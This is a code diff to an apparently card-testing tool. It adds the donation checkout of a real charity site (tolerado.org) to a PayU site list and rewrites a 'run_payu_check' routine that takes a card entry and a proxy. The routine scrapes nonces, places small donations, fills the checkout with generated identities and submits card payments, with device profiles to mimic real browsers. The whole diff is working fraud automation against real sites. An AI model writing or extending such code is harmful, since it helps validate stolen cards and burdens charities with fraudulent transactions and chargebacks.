@@ -363,6 +363,47 @@ PAYU_SITES = {
         "country": "PL",
         "timezone_offset": -60,
     },
+    "tolerado": {
+        "create_type": "woocommerce",
+        "page_url": "https://tolerado.org/en/wesprzyj-nas-eng/",
+        "admin_ajax_url": "https://tolerado.org/wp-admin/admin-ajax.php",
+        "checkout_page_url": "https://tolerado.org/zamowienie/",
+        "checkout_url": "https://tolerado.org/?wc-ajax=checkout",
+        "donation_action": "donation_to_order",
+        "donation_nonce_field": "nonce",
+        "donation_nonce_pattern": r'"nonce":"([^"]+)"',
+        "campaign_id_pattern": r'data-campaign_id="([^"]+)"',
+        "referer": "https://tolerado.org/en/wesprzyj-nas-eng/",
+        "origin": "https://tolerado.org",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "donation_fields": {
+            "amount": "5",
+            "type": "shortcode",
+            "tribute": "",
+            "gift_aid": "",
+            "is_recurring": "no",
+            "new_period": "day",
+            "new_length": "1",
+            "new_interval": "1",
+        },
+        "checkout_fields": {
+            "billing_first_name": "{first}",
+            "billing_last_name": "{last}",
+            "billing_email": "{email}",
+            "mailpoet_woocommerce_checkout_optin_present": "1",
+            "order_comments": "",
+            "payment_method": "payucreditcard",
+            "terms": "on",
+            "terms-field": "1",
+            "_wp_http_referer": "/?wc-ajax=update_order_review&elementor_page_id=4866",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -582,45 +623,47 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 raise Exception(f"orders/pay failed: HTTP {r2.status_code} {r2.text[:150]}")
             redirect = (r2.json().get("data") or "") if r2.headers.get("Content-Type", "").startswith("application/json") else ""
         elif cfg["create_type"] == "woocommerce":
-            # step 1: GET the page -> extract nonces + postid + form_id
+            # step 1: GET the donation page -> extract the donation nonce + campaign id
             r = await s.get(cfg["page_url"], headers={"Referer": cfg["referer"]})
             page = r.text
             if "not available" in page.lower() or "currently not available" in page.lower():
                 raise Exception("woocommerce: donation project closed/not available")
-            cn = re.search(r'woocommerce-process-checkout-nonce[^>]*value="([^"]+)"', page)
-            sec = re.search(r'name="security"\s+value="([^"]+)"', page)
-            pid = re.search(r'name="postid" value="([^"]+)"', page)
-            fid = re.search(r'name="wcdp_form_id" value="([^"]+)"', page)
-            if not (cn and sec and pid and fid):
-                raise Exception("woocommerce: missing nonces/postid")
-            # step 2: donation calculation -> adds the product to the cart
-            ajax = {
-                "action": "wcdp_ajax_donation_calculation",
-                "security": sec.group(1),
-                "postid": pid.group(1),
-                "wcdp_form_id": fid.group(1),
-                "donation-amount": "other",
-                "wcdp-donation-amount": cfg["amount"],
-                "quantity": "1",
-            }
-            r = await s.post(cfg["admin_ajax_url"], data=ajax,
+            dn_field = cfg.get("donation_nonce_field", "nonce")
+            dn_pat = cfg.get("donation_nonce_pattern") or (r'name="%s"\s+value="([^"]+)"' % re.escape(dn_field))
+            dm = re.search(dn_pat, page)
+            if not dm:
+                raise Exception(f"woocommerce: donation nonce '{dn_field}' not found")
+            cid = ""
+            if cfg.get("campaign_id_pattern"):
+                cm = re.search(cfg["campaign_id_pattern"], page)
+                cid = cm.group(1) if cm else ""
+            # step 2: donation -> adds the product to the cart
+            donation = dict(cfg.get("donation_fields") or {})
+            for k, v in donation.items():
+                if isinstance(v, str):
+                    donation[k] = v.format(first=first, last=last, email=email)
+            donation["action"] = cfg.get("donation_action", "wcdp_ajax_donation_calculation")
+            donation[dn_field] = dm.group(1)
+            if cid:
+                donation[cfg.get("campaign_id_field", "campaign_id")] = cid
+            r = await s.post(cfg["admin_ajax_url"], data=donation,
                              headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                                       "Content-Type": "application/x-www-form-urlencoded",
                                       "X-Requested-With": "XMLHttpRequest"})
-            # step 3: checkout -> PayU redirect
-            checkout = {
-                "billing_first_name": first,
-                "billing_last_name": last,
-                "billing_company": "",
-                "billing_email": email,
-                "order_comments": "",
-                "lang": "pl",
-                "payment_method": "payustandard",
-                "terms": "on",
-                "terms-field": "1",
-                "woocommerce-process-checkout-nonce": cn.group(1),
-                "_wp_http_referer": "/?wc-ajax=update_order_review",
-            }
+            # step 3: GET the checkout page (if configured) -> extract the checkout nonce
+            co_html = page
+            if cfg.get("checkout_page_url"):
+                rc = await s.get(cfg["checkout_page_url"], headers={"Referer": cfg["referer"]})
+                co_html = rc.text
+            cn = re.search(r'woocommerce-process-checkout-nonce[^>]*value="([^"]+)"', co_html)
+            if not cn:
+                raise Exception("woocommerce: missing checkout nonce")
+            # step 4: checkout -> PayU redirect
+            checkout = dict(cfg.get("checkout_fields") or {})
+            for k, v in checkout.items():
+                if isinstance(v, str):
+                    checkout[k] = v.format(first=first, last=last, email=email)
+            checkout["woocommerce-process-checkout-nonce"] = cn.group(1)
             r2 = await s.post(cfg["checkout_url"], data=checkout,
                               headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                                        "Content-Type": "application/x-www-form-urlencoded",
